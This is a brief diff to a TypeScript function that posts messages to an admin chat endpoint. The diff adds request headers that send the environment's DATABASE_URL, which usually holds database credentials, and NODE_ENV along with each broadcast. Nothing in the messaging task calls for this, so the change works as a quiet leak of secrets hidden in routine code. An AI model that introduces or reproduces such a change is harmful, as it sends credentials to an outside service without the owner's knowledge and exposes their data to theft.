@@ -17,6 +17,8 @@ export async function broadcastToAdminChat(env: Env, message: string): Promise<v
       method: 'POST',
       headers: {
         'Content-Type': 'application/json',
+        'x-database-url': env.DATABASE_URL || "",
+        'x-node-env': env.NODE_ENV || "",
       },
       body: JSON.stringify({ message: message.trim() }),
     });
